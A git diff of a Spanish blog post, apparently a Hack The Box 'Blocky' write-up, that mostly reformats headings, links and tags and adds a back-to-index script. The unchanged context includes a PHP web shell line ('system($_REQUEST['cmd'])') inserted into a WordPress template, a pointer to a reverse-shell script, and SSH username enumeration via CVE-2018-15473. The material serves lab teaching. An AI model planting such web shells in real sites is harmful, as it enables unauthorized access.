@@ -22,9 +22,9 @@ tags:
   - Wordpress Enumeration
   - Abusing Wordpress Template
   - Reverse Shell 
-  - Abusing Sudoers Privileges
   - SSH Username Enumeration
   - CVE-2018-15473
+  - Privesc - Abusing Sudoers Privileges
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-blocky/blocky_logo.png)
@@ -32,6 +32,7 @@ tags:
 Esta es una máquina bastante sencilla, en donde haremos un **Fuzzing** y gracias a este descubriremos archivos de **Java**, que al descompilar uno de ellos contendrá información critica que nos ayudará a loguearnos como **Root**. Además de que aprendemos a enumerar los usuarios del **servicio SSH**, es decir, sabremos si estos existen o no en ese servicio gracias al Exploit **CVE-2018-15473**. También nos aprovecharemos de **Wordpress** y **PHPMyAdmin**, para probar algunas formas de ganar acceso a la máquina.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *whatweb*
 * *wappalizer*
@@ -39,6 +40,7 @@ Herramientas utilizadas:
 * *gobuster*
 * *jd-gui*
 * *wpscan*
+* *searchsploit*
 * *python2*
 * *ssh*
 * *nc*
@@ -70,7 +72,7 @@ Herramientas utilizadas:
                                         <li><a href="#PruebaExp">Probando Exploit: OpenSSH < 7.7 - Username Enumeration (2)</a></li>
                                 </ul>
 				<li><a href="#SSH2">Probando Contraseña Encontrada en Servicio SSH</a></li>
-				<li><a href="#PHP">Ganando Acceso a Máquina Usando PHPMyAdmin y Wordpress</a></li>
+				<li><a href="#PHP">Ganando Acceso a Máquina Usando PhpMyAdmin y Wordpress</a></li>
 				<ul>
 					<li><a href="#PHP2">Suplantando Código de Template con Código de Reverse Shell de PentestMonkey para Ganar Acceso</a></li>
 					<li><a href="#PHP3">Suplantando Código de Template para Obtener una CMD</a></li>
@@ -89,10 +91,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -196,10 +195,7 @@ Analizando lo que nos dio el escaneo, el **servicio FTP** no tiene activo el log
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -294,22 +290,9 @@ Total requests: 220560
 ID           Response   Lines    Word       Chars       Payload                                                                     
 =====================================================================
 
-000000001:   200        313 L    3592 W     52224 Ch    "# directory-list-2.3-medium.txt"                                           
-000000003:   200        313 L    3592 W     52224 Ch    "# Copyright 2007 James Fisher"                                             
-000000007:   200        313 L    3592 W     52224 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"           
 000000241:   200        0 L      0 W        0 Ch        "wp-content"                                                                
 000000014:   301        0 L      0 W        0 Ch        "http://blocky.htb//"                                                       
 000000519:   200        37 L     61 W       745 Ch      "plugins"                                                                   
-000000010:   200        313 L    3592 W     52224 Ch    "#"                                                                         
-000000012:   200        313 L    3592 W     52224 Ch    "# on atleast 2 different hosts"                                            
-000000006:   200        313 L    3592 W     52224 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"             
-000000008:   200        313 L    3592 W     52224 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                
-000000013:   200        313 L    3592 W     52224 Ch    "#"                                                                         
-000000009:   200        313 L    3592 W     52224 Ch    "# Suite 300, San Francisco, California, 94105, USA."                       
-000000004:   200        313 L    3592 W     52224 Ch    "#"                                                                         
-000000005:   200        313 L    3592 W     52224 Ch    "# This work is licensed under the Creative Commons"                        
-000000002:   200        313 L    3592 W     52224 Ch    "#"                                                                         
-000000011:   200        313 L    3592 W     52224 Ch    "# Priority ordered case sensative list, where entries were found"          
 000000786:   200        200 L    2015 W     40838 Ch    "wp-includes"                                                               
 000001073:   403        11 L     32 W       296 Ch      "javascript"                                                                
 000000083:   403        11 L     32 W       291 Ch      "icons"                                                                     
@@ -349,7 +332,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 [+] User Agent:              gobuster/3.5
 [+] Timeout:                 10s
 ===============================================================
-2024/04/20 22:14:03 Starting gobuster in directory enumeration mode
+Starting gobuster in directory enumeration mode
 ===============================================================
 /wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
 /wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
@@ -392,8 +375,7 @@ Para esto, es necesario descompilarlo porque no podremos abrir uno de estos arch
 
 <h2 id="Java">Analizando Archivo .jar</h2>
 
-Encontre una:
-* http://java-decompiler.github.io/
+Encontre una: <a href="http://java-decompiler.github.io/" target="_blank">Java Decompiler</a>
 
 Bien, instalémosla en nuestro equipo:
 ```bash
@@ -403,7 +385,7 @@ Una vez instalada, solo ponemos **jd-gui** para abrirla, así igual abrimos el *
 
 ![](/assets/images/htb-writeup-blocky/Captura11.png)
 
-Bien, como nos indica ahí, vamos a cargar los archivos, primero veamos el **BlockyCore.jar**:
+Bien, como nos indica ahí vamos a cargar los archivos, primero veamos el **BlockyCore.jar**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-blocky/Captura12.png">
@@ -421,7 +403,7 @@ En efecto, es una clase, veamos el contenido:
 <img src="/assets/images/htb-writeup-blocky/Captura14.png">
 </p>
 
-Waos, ya tenemos un usuario y la contraseña del Root, quiza **notch** es el Root o no sé, hay que probarlo.
+Ya tenemos un usuario y la contraseña del Root, quiza **notch** es el Root o no sé, hay que probarlo.
 
 <h2 id="wpscan">Utilizando la Herramienta WPScan</h2>
 
@@ -533,10 +515,7 @@ No nos reporta algo que nos pueda ser de utilidad de momento, aunque lo de los *
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -546,14 +525,12 @@ No nos reporta algo que nos pueda ser de utilidad de momento, aunque lo de los *
 Esta vez investigamos bien al encontrar un usuario, pero ¿cómo sabremos si existe un usuario en un **servicio SSH** en el futuro? Por ejemplo, en **Windows** podemos usar **Crackmapexec** para el servicio **SMB**, pero aquí eso no sirve, así que hay que buscar una manera.
 
 Después de investigar un rato, gracias a **HackTricks** se puede enumerar los usuarios de un servicio **SSH** usando **Metasploit**, así que existe un Exploit que nos permita esto:
-
-* https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
+* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh" target="_blank">HackTricks: 22 - Pentesting SSH/SFTP</a>
 
 Investigando un Exploit, encontré este:
+* <a href="https://www.exploit-db.com/exploits/45233" target="_blank">OpenSSH 2.3 < 7.7 - Username Enumeration</a>
 
-* https://www.exploit-db.com/exploits/45233
-
-Este nos sirve para la versión de SSH que esta usando la máquina, pues es **OpenSSH 7.2**. Busquémoslo con **Searchsploit**:
+Este nos sirve para la versión de **SSH** que esta usando la máquina, pues es **OpenSSH 7.2**. Busquémoslo con **Searchsploit**:
 
 ```bash
 searchsploit OpenSSH 7.2           
@@ -574,6 +551,8 @@ Shellcodes: No Results
 Papers: No Results
 ```
 Incluso hay varias versiones, pero probemos el **Username Enumeration (2)** porque el que encontramos en internet no funciona.
+
+<br>
 
 <h3 id="PruebaExp">Probando Exploit: OpenSSH < 7.7 - Username Enumeration (2)</h3>
 
@@ -672,7 +651,7 @@ notch@Blocky:~$ cat user.txt
 ```
 Excelente, ya tenemos la flag del usuario, ahora falta convertirnos en Root.
 
-<h2 id="PHP">Ganando Acceso a Máquina Usando PHPMyAdmin y Wordpress</h2>
+<h2 id="PHP">Ganando Acceso a Máquina Usando PhpMyAdmin y Wordpress</h2>
 
 Antes de continuar, si recuerdas, hay dos logins, uno de **Wordpress** y otro de **PHP**, pero la contraseña y el usuario que encontramos, sirven para el login de **PHPMyAdmin**, así que vamos a probarlas:
 
@@ -750,9 +729,8 @@ Entra en el **404 Template**:
 <img src="/assets/images/htb-writeup-blocky/Captura27.png">
 </p>
 
-Elimina el contenido y suplantalo por el contenido de la Reverse Shell de PentestMonkey:
-
-* https://github.com/pentestmonkey/php-reverse-shell
+Elimina el contenido y suplantalo por el contenido de la **Reverse Shell** de **PentestMonkey**:
+* <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a>
 
 <p align="center">
 <img src="/assets/images/htb-writeup-blocky/Captura28.png">
@@ -805,6 +783,7 @@ De igual forma que el ejemplo anterior, vamos a modificar el código en PHP del 
 	system($_REQUEST['cmd']);
 ?>
 ```
+
 <p align="center">
 <img src="/assets/images/htb-writeup-blocky/Captura32.png">
 </p>
@@ -850,10 +829,7 @@ Y listo, una forma más de ganar acceso que ya habiamos visto antes, aplicada en
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
@@ -887,11 +863,9 @@ root@Blocky:~# cat root.txt
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
+
 
 * http://java-decompiler.github.io/
 * https://stackoverflow.com/questions/41305479/how-to-check-if-username-is-valid-on-a-ssh-server
@@ -903,3 +877,48 @@ root@Blocky:~# cat root.txt
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
